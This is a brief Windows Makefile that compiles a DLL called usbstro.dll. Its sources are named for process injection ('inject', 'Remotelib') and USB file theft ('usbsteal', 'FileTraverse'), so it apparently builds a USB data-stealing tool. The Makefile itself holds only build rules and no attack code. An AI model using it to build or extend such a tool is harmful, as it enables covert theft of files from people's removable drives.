CC=cl
CCFLAGS=/EHsc /nologo /Os /MT
LIBS=user32.lib shell32.lib
OBJS=inject.obj Remotelib.obj RemotelibNT.obj misc.obj usbsteal.obj FileTraverse.obj
all: usbstro.dll
zip: all
	zip usbstro.zip usbstro.dll *.exe *.dll
usbstro.dll: $(OBJS)
	$(CC) $(CCFLAGS) $(LIBS) /LD /o $@ /DEF usbstro.def  $(OBJS)
remotelib.obj: RemoteLib.h Kernel32Funcs.h remotelib.cpp
remotelibnt.obj: RemoteLib.h Kernel32Funcs.h remotelibnt.cpp
inject.obj: config.h inject.cpp Kernel32Funcs.h remotelib.h folderutils.h
FileTraverse.obj: FileTraverse.cpp
.cpp.obj:
	$(CC) $(CCFLAGS) /c $*.cpp
.c.obj:
	$(CC) $(CCFLAGS) /c $*.c
clean:
	rm -f *.obj usbstro.dll *.lib *.exp usbstro.zip *.exe
